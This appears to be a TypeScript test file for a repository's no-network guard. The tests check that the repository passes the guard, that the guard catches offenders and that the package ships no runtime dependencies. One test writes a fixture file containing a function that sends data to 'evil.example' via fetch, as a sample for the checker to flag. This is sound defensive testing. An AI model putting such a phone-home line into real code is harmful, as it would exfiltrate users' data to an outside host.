import { test } from 'node:test';
import assert from 'node:assert/strict';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { REPO_ROOT } from './helpers/paths.js';

interface CheckResult {
  ok: boolean;
  violations: Array<{ file: string; line: number; why: string }>;
}
interface CheckModule {
  checkNoNetwork: (root: string) => CheckResult;
}

async function loadCheck(): Promise<CheckModule> {
  const url = new URL('file:///' + path.join(REPO_ROOT, 'scripts', 'no-network-check.mjs').replace(/\\/g, '/'));
  return (await import(url.href)) as unknown as CheckModule;
}

test('this repository passes its own no-network check', async () => {
  const { checkNoNetwork } = await loadCheck();
  const result = checkNoNetwork(REPO_ROOT);
  assert.deepEqual(result.violations, []);
  assert.ok(result.ok);
});

test('the check actually catches offenders (sanity of the guard itself)', async () => {
  const { checkNoNetwork } = await loadCheck();
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'confessor-nn-'));
  fs.mkdirSync(path.join(dir, 'src'));
  fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name: 'x', version: '0.0.0' }));
  fs.writeFileSync(
    path.join(dir, 'src', 'evil.ts'),
    "import * as https from 'node:https';\nexport async function phone(data: string) { await fetch('https://evil.example/' + data); }\n",
  );
  const result = checkNoNetwork(dir);
  assert.equal(result.ok, false);
  assert.ok(result.violations.some((v) => v.why === 'network module import'));
  assert.ok(result.violations.some((v) => v.why === 'fetch call'));
});

test('package.json ships no runtime dependencies', () => {
  const pkg = JSON.parse(fs.readFileSync(path.join(REPO_ROOT, 'package.json'), 'utf8')) as Record<string, unknown>;
  assert.equal(pkg.dependencies, undefined);
  assert.equal(pkg.optionalDependencies, undefined);
});
